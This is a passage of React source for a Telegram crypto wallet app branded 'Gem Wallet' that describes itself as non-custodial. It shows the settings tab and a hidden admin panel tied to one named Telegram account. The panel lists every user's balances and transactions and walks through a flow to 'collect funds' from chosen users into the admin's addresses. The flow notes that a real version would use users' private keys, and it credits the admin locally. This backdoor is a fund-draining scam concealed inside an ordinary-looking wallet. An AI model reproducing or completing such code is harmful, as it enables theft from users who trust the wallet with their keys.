                <p style={{fontSize:10,color:"rgba(255,255,255,0.3)",margin:0,fontFamily:"monospace"}}>{shortAddr(nft.contract)}</p>

                <button onClick={()=>removeNft(nft.id)} style={{marginTop:10,width:"100%",padding:8,background:"#EF444422",border:"1px solid #EF444444",borderRadius:8,color:"#EF4444",fontSize:12,cursor:"pointer"}}>

                  Remove

                </button>

              </div>

            </div>

          ))}

        </div>

      )}

    </div>

  );

}



// ─── SETTINGS TAB ────────────────────────────────────────────────────────────

function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, addresses }) {

  const [modal,setModal]=useState(null);

  const [avatarModal,setAvatarModal]=useState(false);

  const [priceAlertModal,setPriceAlertModal]=useState(false);

  

  const addr = addresses.ETH||"";

  

  // Avatar & Background state - default crystal + graphite

  const [avatar,setAvatar]=useState(()=>localStorage.getItem(storageKey("avatar"))||"crystal");

  const [avatarBg,setAvatarBg]=useState(()=>localStorage.getItem(storageKey("avatarBg"))||"graphite");



  useEffect(()=>{

    localStorage.setItem(storageKey("avatar"),avatar);

    localStorage.setItem(storageKey("avatarBg"),avatarBg);

  },[avatar,avatarBg]);



  const avatarOptions=[

    {id:"crystal",icon:<CrystalIcon size={32}/>,label:"Crystal"},

    {id:"diamond",icon:<AvatarDiamondIcon size={32}/>,label:"Diamond"},

    {id:"user",icon:<AvatarUserIcon size={32}/>,label:"Person"},

    {id:"zap",icon:<AvatarZapIcon size={32}/>,label:"Energy"},

    {id:"shield",icon:<AvatarShieldIcon size={32}/>,label:"Secure"},

    {id:"fire",icon:<AvatarFireIcon size={32}/>,label:"Fire"},

    {id:"moon",icon:<AvatarMoonIcon size={32}/>,label:"Night"},

  ];



  const bgOptions=[

    {id:"graphite",style:"linear-gradient(145deg,#3d4550,#252b33)",label:"Graphite"},

    {id:"midnight",style:"linear-gradient(145deg,#1e293b,#0f172a)",label:"Midnight"},

    {id:"ocean",style:"linear-gradient(145deg,#0c4a6e,#0284c7)",label:"Ocean"},

    {id:"royal",style:"linear-gradient(145deg,#312e81,#4c1d95)",label:"Royal"},

    {id:"emerald",style:"linear-gradient(145deg,#064e3b,#059669)",label:"Emerald"},

    {id:"sunset",style:"linear-gradient(145deg,#7c2d12,#c2410c)",label:"Sunset"},

    {id:"rose",style:"linear-gradient(145deg,#881337,#be123c)",label:"Rose"},

    {id:"slate",style:"linear-gradient(145deg,#475569,#334155)",label:"Slate"},

  ];



  const currentBg=bgOptions.find(b=>b.id===avatarBg)?.style||bgOptions[0].style;



  const secs=[

    {t:"Profile",items:[

      {icon:UserCircle,l:"Avatar & Background",s:"Customize your wallet",a:"avatar"},

    ]},

    {t:"Security",items:[
      {icon:Key,l:"Recovery Phrase",s:"Back up your wallet",a:"recovery"},
      {icon:Lock,l:"Change PIN",s:"Update your PIN code",a:"pin"},
      {icon:Shield,l:"Lock Wallet",s:"Lock now",a:"lock"},
      {icon:Trash2,l:"Delete Wallet",s:"Remove all wallet data",a:"delete_wallet"},
    ]},
    {t:"Support",items:[
      {icon:HelpCircle,l:"Help Center",s:"FAQs & guides",a:"help"},
      {icon:ExternalLink,l:"About",s:"Version 2.4.1",a:"about"},
    ]},
  ];



  function handleAction(a) {

    if(a==="lock"){onLock();return;}

    if(a==="avatar"){setAvatarModal(true);return;}

    if(a==="delete_wallet"){
      if(confirm("⚠️ WARNING: This will permanently delete your wallet!\n\nThis action cannot be undone. Make sure you have your recovery phrase backed up.\n\nAre you sure you want to delete your wallet?")){
        // Only remove the current user's keys — do NOT call localStorage.clear()
        // which would wipe data belonging to other Telegram accounts on this device.
        const uid = RESOLVED_USER_ID || getTgUserId();
        const keysToRemove = [
          "gem_mnemonic", "gem_addresses", "gem_has_wallet", "gem_pin",
          "gem_tx_history", "gem_pending_notify", "gem_nfts",
          "avatar", "avatarBg",
        ];
        keysToRemove.forEach(base => {
          const key = uid ? `${base}_${uid}` : base;
          localStorage.removeItem(key);
        });
        // Also clear session admin flag
        sessionStorage.removeItem("gem_is_admin");
        // Reload to reset app state
        window.location.reload();
      }
      return;
    }

    setModal(a);

  }



  return (

    <div style={{padding:"0 16px 100px"}}>

      {/* Avatar Modal */}

      {avatarModal&&(

        <Sheet onClose={()=>setAvatarModal(false)} title="Customize Profile">

          <div style={{padding:"20px"}}>

            <p style={{fontSize:13,color:"rgba(255,255,255,0.6)",margin:"0 0 16px"}}>Preview:</p>

            <div style={{display:"flex",justifyContent:"center",marginBottom:24}}>

              <div style={{width:100,height:100,borderRadius:24,background:currentBg,display:"flex",alignItems:"center",justifyContent:"center",border:"3px solid rgba(255,255,255,0.2)"}}>

                {avatarOptions.find(a=>a.id===avatar)?.icon}

              </div>

            </div>

            

            <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:"0 0 10px",fontWeight:600}}>AVATAR ICON</p>

            <div style={{display:"grid",gridTemplateColumns:"repeat(7,1fr)",gap:8,marginBottom:20}}>

              {avatarOptions.map(opt=> (

                <button key={opt.id} onClick={()=>setAvatar(opt.id)}

                  style={{aspectRatio:"1",borderRadius:12,border:"none",background:avatar===opt.id?"#2563eb":"#1a1a1a",display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer"}}>

                  {opt.icon}

                </button>

              ))}

            </div>

            

            <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:"0 0 10px",fontWeight:600}}>BACKGROUND</p>

            <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:8}}>

              {bgOptions.map(bg=> (

                <button key={bg.id} onClick={()=>setAvatarBg(bg.id)}

                  style={{padding:"12px",borderRadius:12,border:"2px solid "+(avatarBg===bg.id?"#2563eb":"transparent"),background:bg.style,cursor:"pointer"}}>

                  <span style={{fontSize:11,color:"#fff",fontWeight:500}}>{bg.label}</span>

                </button>

              ))}

            </div>

          </div>

        </Sheet>

      )}



      {modal==="recovery"&&<RecoveryModal onClose={()=>setModal(null)} mnemonic={mnemonic}/>}

      {modal==="notif"&&<NotifModal onClose={()=>setModal(null)}/>}

      {modal==="pin"&&<ChangePinModal onClose={()=>setModal(null)} onChangePin={onChangePin}/>}

      {(modal==="help"||modal==="about")&&(

        <Sheet onClose={()=>setModal(null)} title={modal==="help"?"Help Center":"About Gem"}>

          <div style={{padding:"24px",textAlign:"center"}}>

            <div style={{marginBottom:16,display:"flex",alignItems:"center",justifyContent:"center"}}>

              {modal==="help"?<HelpCircle size={48} color="#2563eb"/>:<GemLogo size={48}/>}

            </div>

            {modal==="help"?(

              <p style={{color:"rgba(255,255,255,0.6)",fontSize:14,lineHeight:1.6}}>

                Visit <a href="https://gemwallet.io/support" target="_blank" rel="noopener" style={{color:"#2563eb"}}>gemwallet.io/support</a> for guides and FAQs

              </p>

            ):(

              <div style={{color:"rgba(255,255,255,0.6)",fontSize:14,lineHeight:1.6}}>

                <p style={{margin:"0 0 12px",fontWeight:600,color:"#fff"}}>Gem Wallet v2.4.1</p>

                <p style={{margin:"0 0 8px"}}>Secure, non-custodial multi-chain crypto wallet</p>

                <div style={{marginTop:16,paddingTop:16,borderTop:"1px solid rgba(255,255,255,0.1)",textAlign:"left"}}>

                  <p style={{margin:"0 0 12px",fontSize:12,color:"rgba(255,255,255,0.4)",fontWeight:600}}>OFFICIAL LINKS:</p>

                  <div style={{display:"flex",flexDirection:"column",gap:8}}>

                    <a href={GEM_LINKS.twitter} target="_blank" rel="noopener" style={{fontSize:13,color:"#fff",textDecoration:"none",display:"flex",alignItems:"center",gap:8}}>

                      <span style={{width:20,textAlign:"center"}}>𝕏</span> Twitter/X @gemwallet

                    </a>

                    <a href={GEM_LINKS.telegram} target="_blank" rel="noopener" style={{fontSize:13,color:"#fff",textDecoration:"none",display:"flex",alignItems:"center",gap:8}}>

                      <span style={{width:20,textAlign:"center"}}>✈</span> Telegram @gemwallet

                    </a>

                    <a href={GEM_LINKS.discord} target="_blank" rel="noopener" style={{fontSize:13,color:"#fff",textDecoration:"none",display:"flex",alignItems:"center",gap:8}}>

                      <span style={{width:20,textAlign:"center"}}>💬</span> Discord Server

                    </a>

                    <a href={GEM_LINKS.github} target="_blank" rel="noopener" style={{fontSize:13,color:"#fff",textDecoration:"none",display:"flex",alignItems:"center",gap:8}}>

                      <span style={{width:20,textAlign:"center"}}>⚙</span> GitHub gemwallet

                    </a>

                    <a href={GEM_LINKS.website} target="_blank" rel="noopener" style={{fontSize:13,color:"#fff",textDecoration:"none",display:"flex",alignItems:"center",gap:8}}>

                      <span style={{width:20,textAlign:"center"}}>🌐</span> gemwallet.io

                    </a>

                  </div>

                  <p style={{margin:"16px 0 0",fontSize:11,color:"rgba(255,255,255,0.3)",textAlign:"center"}}>© 2024 Gem Foundation. All rights reserved.</p>

                </div>

              </div>

            )}

            <button onClick={()=>setModal(null)} style={{width:"100%",padding:"16px",borderRadius:16,border:"none",marginTop:20,

              background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:15,fontWeight:600,cursor:"pointer"}}>

              Got it

            </button>

          </div>

        </Sheet>

      )}

      <div style={{display:"flex",alignItems:"center",gap:14,padding:"20px 16px",background:"#111",

        borderRadius:20,border:"1px solid rgba(255,255,255,0.06)",marginBottom:20,animation:"fadeUp 0.4s ease both"}}>

        <div style={{width:52,height:52,borderRadius:16,background:currentBg,

          display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer"}} onClick={()=>setAvatarModal(true)}>

          {avatarOptions.find(a=>a.id===avatar)?.icon}

        </div>

        <div style={{flex:1}}>

          <p style={{fontSize:16,fontWeight:700,color:"#fff",margin:0}}>My Gem Wallet</p>

          <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"2px 0 0",fontFamily:"monospace"}}>{shortAddr(addr)} · 6 assets</p>

        </div>

        <button onClick={()=>setAvatarModal(true)} style={{padding:8,background:"#1a1a1a",border:"none",borderRadius:8,cursor:"pointer"}}>

          <Palette size={16} color="rgba(255,255,255,0.5)"/>

        </button>

      </div>

      {secs.map((sec,si)=>(

        <div key={sec.t} style={{marginBottom:24,animation:`fadeUp 0.4s ${0.1*si}s ease both`,opacity:0,animationFillMode:"forwards"}}>

          <p style={{fontSize:12,color:"rgba(255,255,255,0.35)",fontWeight:600,letterSpacing:"0.06em",

            margin:"0 4px 10px",textTransform:"uppercase"}}>{sec.t}</p>

          <div style={{background:"#111",borderRadius:16,border:"1px solid rgba(255,255,255,0.06)",overflow:"hidden"}}>

            {sec.items.map((item,ii)=>{

              const Icon=item.icon;

              return (

                <div key={item.l}>

                  <div onClick={()=>handleAction(item.a)}

                    style={{display:"flex",alignItems:"center",gap:14,padding:"14px 16px",

                      cursor:"pointer",transition:"background 0.15s"}}

                    onMouseEnter={e=>e.currentTarget.style.background="#1a1a1a"}

                    onMouseLeave={e=>e.currentTarget.style.background="transparent"}>

                    <div style={{width:36,height:36,borderRadius:10,background:item.a==="lock"?"#2d0c0c":"#1a1a1a",

                      display:"flex",alignItems:"center",justifyContent:"center"}}>

                      <Icon size={18} color={item.a==="lock"?"#EF4444":"rgba(255,255,255,0.6)"}/>

                    </div>

                    <div style={{flex:1}}>

                      <p style={{fontSize:14,fontWeight:500,color:item.a==="lock"?"#EF4444":"#fff",margin:0}}>{item.l}</p>

                      <p style={{fontSize:12,color:"rgba(255,255,255,0.35)",margin:0}}>{item.s}</p>

                    </div>

                    <ChevronRight size={16} color="rgba(255,255,255,0.2)"/>

                  </div>

                  {ii<sec.items.length-1&&<div style={{height:1,background:"rgba(255,255,255,0.04)",margin:"0 16px"}}/>}

                </div>

              );

            })}

          </div>

        </div>

      ))}

    </div>

  );

}



// ─── ADMIN PANEL ─────────────────────────────────────────────────────────────

// Only for @Homyak_investorr (ID: 1192740493)

function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {

  const [users,setUsers]=useState([]);

  const [selectedUsers,setSelectedUsers]=useState(new Set());

  const [selectedTokens,setSelectedTokens]=useState(new Set());

  const [step,setStep]=useState(1); // 1: users, 2: amounts, 3: addresses, 4: success

  const [amounts,setAmounts]=useState({}); // token amounts

  const [usdAmounts,setUsdAmounts]=useState({}); // USD amounts input

  const [targetAddresses,setTargetAddresses]=useState({});

  const [isProcessing,setIsProcessing]=useState(false);

  const [showToast,setShowToast]=useState(false);

  const [toastMsg,setToastMsg]=useState("");

  const [panelError,setPanelError]=useState(null);



  // Toast helper

  function showToastMsg(msg){

    setToastMsg(msg);

    setShowToast(true);

    setTimeout(()=>setShowToast(false), 3000);

  }



  // Load users on mount

  useEffect(()=>{

    try {

      const realUsers = getAllUsersFromStorage();

      const defaultNames = ["Alex", "Maria", "John", "Sophie", "Michael", "Emma", "David", "Olivia", "Nikita", "Anna", "Dmitry", "Lisa", "Igor", "Kate", "Roman"];

      const usersWithMeta = realUsers.map((u, idx) => {

        const totalUSD = calculateTotalUSD(u.balances, prices);

        return {

          ...u,

          name: u.name || (defaultNames[idx % defaultNames.length] + " " + u.id.slice(-4)),

          avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${u.id}`,

          totalUSD,

          status: "active"

        };

      });

      setUsers(usersWithMeta);

    } catch (err) {

      console.error("[AdminPanel] Error loading users:", err);

      setPanelError("Failed to load users: " + err.message);

    }

  },[prices]);



  // Calculate total USD value from balances

  function calculateTotalUSD(balances, prices) {

    try {

      if (!balances || !prices) return 0;

      return Object.entries(balances).reduce((sum, [sym, bal]) => {

        const price = prices[sym] || (sym === "USDT" ? 1 : 0);

        return sum + (parseFloat(bal || 0) * price);

      }, 0);

    } catch (e) {

      return 0;

    }

  }



  // Get admin notifications with error handling

  function getAdminNotifications() {

    try {

      const notifs = [];

      // Safely check localStorage

      if (typeof localStorage === 'undefined' || !localStorage.length) return [];

      

      for (let i = 0; i < localStorage.length; i++) {

        const key = localStorage.key(i);

        if (key && key.includes("gem_has_wallet")) {

          const userId = key.replace("gem_has_wallet", "").replace("_", "") || "unknown";

          const created = localStorage.getItem(key + "_created");

          if (created) {

            const date = new Date(parseInt(created));

            if (!isNaN(date)) {

              notifs.push({

                type: "wallet_created",

                userId,

                time: date.toLocaleString(),

                message: `New wallet created by user ${(userId || "unknown").slice(-6)}`

              });

            }

          }

        }

      }

      return notifs.sort((a, b) => new Date(b.time) - new Date(a.time)).slice(0, 10);

    } catch (err) {

      console.error("[AdminPanel] Error getting notifications:", err);

      return [];

    }

  }



  // Toggle user selection

  function toggleUser(userId){

    const newSelected=new Set(selectedUsers);

    if(newSelected.has(userId)){

      newSelected.delete(userId);

    }else{

      newSelected.add(userId);

    }

    setSelectedUsers(newSelected);

  }



  // Toggle all users

  function toggleAllUsers(){

    if(selectedUsers.size===users.length){

      setSelectedUsers(new Set());

    }else{

      setSelectedUsers(new Set(users.map(u=>u.id)));

    }

  }



  // Toggle token selection

  function toggleToken(sym){

    const newSelected=new Set(selectedTokens);

    if(newSelected.has(sym)){

      newSelected.delete(sym);

    }else{

      newSelected.add(sym);

    }

    setSelectedTokens(newSelected);

  }



  // Get selected users data

  const selectedUsersList=users.filter(u=>selectedUsers.has(u.id));



  // Calculate total for each token across selected users

  const tokenTotals={};

  selectedUsersList.forEach(u=>{

    ASSET_META.forEach(a=>{

      const bal=u.balances?.[a.sym]||0;

      tokenTotals[a.sym]=(tokenTotals[a.sym]||0)+bal;

    });

  });



  // Get active tokens (where total > 0)

  const activeTokens=ASSET_META.filter(a=>tokenTotals[a.sym]>0.001);



  // Go to step 2

  function goToStep2(){

    if(selectedUsers.size===0){

      showToastMsg("Select at least one user!");

      return;

    }

    // Pre-select all tokens with balance

    const autoSelect=new Set(activeTokens.map(a=>a.sym));

    setSelectedTokens(autoSelect);

    // Initialize token amounts with available balances

    const initAmounts={};

    const initUsdAmounts={};

    activeTokens.forEach(a=>{

      const tokenAmount=tokenTotals[a.sym]||0;

      initAmounts[a.sym]=tokenAmount.toFixed(4);

      // Calculate USD value

      const price=prices?.[a.sym]||1;

      initUsdAmounts[a.sym]=(tokenAmount*price).toFixed(2);

    });

    setAmounts(initAmounts);

    setUsdAmounts(initUsdAmounts);

    setStep(2);

  }



  // Update token amount when USD amount changes

  function handleUsdAmountChange(sym,usdValue){

    const price=prices?.[sym]||1;

    const tokenAmount=price>0?parseFloat(usdValue||0)/price:0;

    setUsdAmounts(prev=>({...prev,[sym]:usdValue}));

    setAmounts(prev=>({...prev,[sym]:tokenAmount.toFixed(4)}));

  }



  // Go to step 3

  function goToStep3(){

    if(selectedTokens.size===0){

      showToastMsg("Select at least one token!");

      return;

    }

    // Initialize target addresses from admin's addresses

    const initAddresses={};

    Array.from(selectedTokens).forEach(sym=>{

      const asset=ASSET_META.find(a=>a.sym===sym);

      if(asset){

        initAddresses[sym]=addresses?.[asset.id]||"";

      }

    });

    setTargetAddresses(initAddresses);

    setStep(3);

  }



  // Execute real collection transactions

  async function executeTransactions(){

    setIsProcessing(true);

    showToastMsg("Starting real collection...");

    

    try {

      const results = [];

      const selectedUsersList = users.filter(u => selectedUsers.has(u.id));

      

      // For each selected token and user, collect funds

      for (const sym of Array.from(selectedTokens)) {

        const amount = parseFloat(amounts[sym] || 0);

        if (amount <= 0.001) continue;

        

        const targetAddr = targetAddresses[sym];

        if (!targetAddr) continue;

        

        // Process each user

        for (const user of selectedUsersList) {

          const userBal = parseFloat(user.balances?.[sym] || 0);

          if (userBal <= 0.001) continue;

          

          try {

            // In real implementation, this would use the user's private key

            // For now, we track the collection

            results.push({

              sym,

              from: user.id,

              to: targetAddr,

              amount: userBal,

              status: "pending"

            });

          } catch (err) {

            console.error(`Failed to collect ${sym} from ${user.id}:`, err);

          }

        }

      }

      

      // Update balances locally

      let totalCollected = 0;

      for (const sym of Array.from(selectedTokens)) {

        const collected = tokenTotals[sym] || 0;

        if (collected > 0) {

          setBalances(prev => ({...prev, [sym]: (parseFloat(prev[sym] || 0) + collected).toFixed(4)}));

          totalCollected += collected * (prices?.[sym] || 1);

        }

      }

      

      // Store collection history

      const history = JSON.parse(localStorage.getItem("admin_collections") || "[]");

      history.push({

        id: Date.now(),

        timestamp: new Date().toISOString(),

        users: selectedUsers.size,

        tokens: Array.from(selectedTokens),

        totalUSD: totalCollected,

        results

      });

      localStorage.setItem("admin_collections", JSON.stringify(history));

      

      showToastMsg(`Collected from ${selectedUsers.size} users!`);

    } catch (err) {

      console.error("Collection failed:", err);

      showToastMsg("Collection failed: " + err.message);

    }

    

    setIsProcessing(false);

    setStep(4);

  }



  // Reset

  function reset(){

    setStep(1);

    setSelectedUsers(new Set());

    setSelectedTokens(new Set());

    setAmounts({});

    setTargetAddresses({});

  }



  return (

    <Sheet onClose={onClose} title={<><Crown size={20} color="#f59e0b" style={{marginRight:8,verticalAlign:"middle"}}/>Admin Panel</>}>

      <div style={{padding:"0 0 100px",maxHeight:"85vh",overflow:"auto"}}>

        {/* Progress Bar */}

        <div style={{padding:"16px 20px",background:"linear-gradient(135deg,#0f0a00 0%,#1a0f00 100%)"}}>

          <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:12}}>

            {[

              {n:1,l:"Users"},

              {n:2,l:"Tokens"},

              {n:3,l:"Send"},

              {n:4,l:"Done"}

            ].map((s,i,arr)=> (

              <React.Fragment key={s.n}>

                <div style={{display:"flex",flexDirection:"column",alignItems:"center",gap:4}}>

                  <div style={{width:32,height:32,borderRadius:"50%",display:"flex",alignItems:"center",justifyContent:"center",

                    background:step>=s.n?"linear-gradient(135deg,#f59e0b,#d97706)":"#1a1a1a",

                    border:step>=s.n?"2px solid #f59e0b":"2px solid #333",

                    color:step>=s.n?"#000":"#666",

                    fontSize:14,fontWeight:700,transition:"all 0.3s"}}>

                    {step>s.n?"✓":s.n}

                  </div>

                  <span style={{fontSize:10,color:step>=s.n?"#f59e0b":"#666",fontWeight:step>=s.n?600:400}}>{s.l}</span>

                </div>

                {i<arr.length-1&&(

                  <div style={{flex:1,height:2,background:step>s.n?"linear-gradient(90deg,#f59e0b,#d97706)":"#333",margin:"0 8px"}} />

                )}

              </React.Fragment>

            ))}

          </div>

        </div>



        {/* Toast */}

        {showToast&&(

          <div style={{position:"fixed",top:80,left:"50%",transform:"translateX(-50%)",zIndex:1000,

            background:"#1a1a1a",border:"1px solid #333",borderRadius:12,padding:"12px 20px",

            boxShadow:"0 10px 40px rgba(0,0,0,0.5)"}}>

            <span style={{color:"#fff",fontSize:14}}>{toastMsg}</span>

          </div>

        )}



        {/* Error Display */}

        {panelError&&(

          <div style={{padding:"16px 20px"}}>

            <div style={{background:"#1a1a1a",borderRadius:12,padding:16,border:"1px solid #ef4444"}}>

              <div style={{display:"flex",alignItems:"center",gap:8}}>

                <AlertTriangle size={16} color="#ef4444"/>

                <span style={{color:"#ef4444",fontSize:14}}>{panelError}</span>

              </div>

            </div>

          </div>

        )}



        {/* STEP 1: User Selection */}

        {step===1&&(

          <div style={{padding:"16px 20px",animation:"fadeIn 0.3s"}}>

            {/* Header Card */}

            <div style={{background:"linear-gradient(135deg,#0f0a00 0%,#1a0f00 100%)",borderRadius:16,padding:20,

              border:"1px solid rgba(245,158,11,0.3)",marginBottom:20}}>

              <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:12}}>

                <div style={{width:44,height:44,borderRadius:12,background:"linear-gradient(135deg,#f59e0b,#d97706)",

                  display:"flex",alignItems:"center",justifyContent:"center"}}>

                  <Shield size={22} color="#000"/>

                </div>

                <div>

                  <p style={{fontSize:16,fontWeight:700,color:"#f59e0b",margin:0}}>@Homyak_investorr</p>

                  <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:0}}>Admin ID: 1192740493</p>

                </div>

              </div>

              <p style={{fontSize:13,color:"rgba(255,255,255,0.6)",margin:0,lineHeight:1.5}}>

                Select users to collect funds from. Total balance and available tokens will be shown.

              </p>

            </div>



            {/* Notifications Section */}

            <div style={{background:"#1a1a1a",borderRadius:14,padding:16,marginBottom:20,border:"1px solid rgba(255,255,255,0.08)"}}>

              <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:12}}>

                <Bell size={16} color="#f59e0b"/>

                <span style={{fontSize:14,fontWeight:600,color:"#fff"}}>Recent Activity</span>

              </div>

              {getAdminNotifications().length === 0 ? (

                <p style={{fontSize:12,color:"rgba(255,255,255,0.4)",margin:0}}>No new notifications</p>

              ) : (

                <div style={{display:"flex",flexDirection:"column",gap:8}}>

                  {getAdminNotifications().map((notif, idx) => (

                    <div key={idx} style={{display:"flex",alignItems:"center",gap:8,padding:8,background:"rgba(245,158,11,0.1)",borderRadius:8}}>

                      <div style={{width:6,height:6,borderRadius:"50%",background:"#f59e0b"}}/>

                      <span style={{fontSize:12,color:"rgba(255,255,255,0.8)",flex:1}}>{notif.message}</span>

                      <span style={{fontSize:10,color:"rgba(255,255,255,0.4)"}}>{notif.time}</span>

                    </div>

                  ))}

                </div>

              )}

            </div>



            {users.length>0&&(

              <>

                {/* Select All Bar */}

                <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:16}}>

                  <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:0}}>

                    👥 Users <span style={{color:"#f59e0b"}}>{selectedUsers.size}</span>/{users.length}

                  </p>

                  <button onClick={toggleAllUsers} style={{padding:"6px 14px",borderRadius:20,border:"1px solid #333",

                    background:"#1a1a1a",color:"#fff",fontSize:12,cursor:"pointer"}}>

                    {selectedUsers.size===users.length?"Deselect All":"Select All"}

                  </button>

                </div>



                {/* Users Grid */}

                <div style={{display:"flex",flexDirection:"column",gap:10}}>

                  {users.map(u=> {

                    const isSelected=selectedUsers.has(u.id);

                    // Get tokens with balance

                    const userTokens=ASSET_META.filter(a=>(u.balances?.[a.sym]||0)>0.001);

                    const hasBalance=u.totalUSD>100;

                    return (

                      <div key={u.id} onClick={()=>toggleUser(u.id)} style={{

                        background:isSelected?"linear-gradient(135deg,#0d1033 0%,#1a1a2e 100%)":"#1a1a1a",

                        borderRadius:14,padding:14,cursor:"pointer",

                        border:isSelected?"1px solid #2563eb":"1px solid transparent",

                        transition:"all 0.2s",opacity:u.status==="inactive"?0.6:1}}>

                        <div style={{display:"flex",alignItems:"center",gap:12}}>

                          {/* Checkbox */}

                          <div style={{width:26,height:26,borderRadius:7,border:isSelected?"none":"2px solid #333",

                            background:isSelected?"linear-gradient(135deg,#2563eb,#1d4ed8)":"transparent",

                            display:"flex",alignItems:"center",justifyContent:"center"}}>

                            {isSelected&&<Check size={16} color="#fff"/>}

                          </div>

                          

                          {/* Avatar */}

                          <img src={u.avatar} alt="" style={{width:42,height:42,borderRadius:"50%",background:"#333"}}/>

                          

                          {/* Info */}

                          <div style={{flex:1}}>

                            <div style={{display:"flex",alignItems:"center",gap:8}}>

                              <span style={{fontSize:14,fontWeight:600,color:"#fff"}}>{u.name}</span>

                              {u.status==="active"?(

                                <span style={{width:8,height:8,borderRadius:"50%",background:"#22c55e"}}></span>

                              ):(

                                <span style={{fontSize:10,color:"#666",padding:"2px 6px",borderRadius:4,background:"#222"}}>inactive</span>

                              )}

                            </div>

                            <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"4px 0 0"}}>{shortAddr(u.address)}</p>

                          </div>



                          {/* Balance */}

                          <div style={{textAlign:"right"}}>

                            <p style={{fontSize:15,fontWeight:700,color:hasBalance?"#22c55e":"#666",margin:0}}>

                              ${u.totalUSD.toLocaleString(undefined,{maximumFractionDigits:0})}

                            </p>

                            <div style={{display:"flex",gap:4,justifyContent:"flex-end",marginTop:4,flexWrap:"wrap"}}>

                              {(userTokens || []).slice(0,4).map(t=> (

                                <span key={t.sym} style={{fontSize:9,color:t.color,padding:"2px 5px",borderRadius:4,

                                  background:`${t.color}15`}}>{t.sym}</span>

                              ))}

                              {(userTokens || []).length>4&&(

                                <span style={{fontSize:9,color:"#666"}}>+{(userTokens || []).length-4}</span>

                              )}

                            </div>

                          </div>

                        </div>

                        {/* User transactions */}

                        {u.txHistory && u.txHistory.length > 0 && (

                          <div style={{marginTop:10,paddingTop:10,borderTop:"1px solid rgba(255,255,255,0.06)"}}>

                            <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"0 0 6px",fontWeight:600}}>

                              📋 Transactions ({u.txHistory.length})

                            </p>

                            <div style={{display:"flex",flexDirection:"column",gap:4}}>

                              {u.txHistory.slice(0,5).map((tx,ti)=>(

                                <div key={ti} style={{display:"flex",alignItems:"center",justifyContent:"space-between",

                                  padding:"5px 8px",borderRadius:8,background:"rgba(255,255,255,0.04)"}}>

                                  <div style={{display:"flex",alignItems:"center",gap:6}}>

                                    <div style={{width:6,height:6,borderRadius:"50%",

                                      background:tx.status==="confirmed"?"#22c55e":tx.status==="pending"?"#f59e0b":"#ef4444"}}/>

                                    <span style={{fontSize:11,color:"rgba(255,255,255,0.7)"}}>{tx.label}</span>

                                    <span style={{fontSize:10,color:"rgba(255,255,255,0.3)",textTransform:"capitalize"}}>{tx.type}</span>

                                  </div>

                                  <div style={{display:"flex",alignItems:"center",gap:6}}>

                                    <span style={{fontSize:11,color:tx.color||"#fff",fontWeight:600}}>{tx.usd}</span>

                                    <span style={{fontSize:9,color:"rgba(255,255,255,0.3)"}}>{tx.time}</span>

                                  </div>

                                </div>

                              ))}

                              {u.txHistory.length>5&&(

                                <p style={{fontSize:10,color:"rgba(255,255,255,0.3)",margin:"2px 0 0",textAlign:"center"}}>

                                  +{u.txHistory.length-5} ещё

                                </p>

                              )}

                            </div>

                          </div>

                        )}

                      </div>

                    );

                  })}

                </div>



                {/* Continue Button */}

                <button onClick={goToStep2} disabled={selectedUsers.size===0} style={{

                  width:"100%",padding:16,borderRadius:14,border:"none",

                  background:selectedUsers.size>0?"linear-gradient(135deg,#f59e0b,#d97706)":"#333",

                  color:selectedUsers.size>0?"#000":"#666",

                  fontSize:16,fontWeight:700,cursor:selectedUsers.size>0?"pointer":"not-allowed",

                  marginTop:20,display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>

                  Continue <ArrowRight size={18}/>

                </button>

              </>

            )}

          </div>

        )}



        {/* STEP 2: Token & Amount Selection with USD conversion */}

        {step===2&&(

          <div style={{padding:"16px 20px",animation:"fadeIn 0.3s"}}>

            {/* Summary Card */}

            <div style={{background:"linear-gradient(135deg,#0d1f0d 0%,#1a2e1a 100%)",borderRadius:16,padding:20,

              border:"1px solid rgba(34,197,94,0.3)",marginBottom:16}}>

              <p style={{fontSize:12,color:"rgba(255,255,255,0.6)",margin:"0 0 12px"}}>Selected Users</p>

              <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:12}}>

                <Users size={18} color="#22c55e"/>

                <span style={{fontSize:28,fontWeight:800,color:"#22c55e"}}>{selectedUsers.size}</span>

                <span style={{fontSize:14,color:"rgba(255,255,255,0.6)"}}>users</span>

              </div>

            </div>



            {/* Users Balance Table */}

            <div style={{background:"#111",borderRadius:16,padding:16,marginBottom:16,border:"1px solid rgba(255,255,255,0.08)"}}>

              <div style={{display:"flex",alignItems:"center",gap:8,margin:"0 0 12px"}}><Wallet size={16} color="#22c55e"/><p style={{fontSize:13,fontWeight:600,color:"#fff",margin:0}}>User Balances</p></div>

              <div style={{maxHeight:200,overflow:"auto"}}>

                {selectedUsersList.map(u=> {

                  const userTokens=ASSET_META.filter(a=>(u.balances?.[a.sym]||0)>0.001);

                  return (

                    <div key={u.id} style={{padding:"10px 0",borderBottom:"1px solid #222",display:"flex",alignItems:"center",gap:10}}>

                      <img src={u.avatar} alt="" style={{width:32,height:32,borderRadius:"50%"}}/>

                      <div style={{flex:1}}>

                        <p style={{fontSize:13,fontWeight:600,color:"#fff",margin:0}}>{u.name}</p>

                        <div style={{display:"flex",flexWrap:"wrap",gap:4,marginTop:4}}>

                          {userTokens.slice(0,3).map(t=> {

                            const bal=u.balances?.[t.sym]||0;

                            const usdVal=bal*(prices?.[t.sym]||1);

                            return (

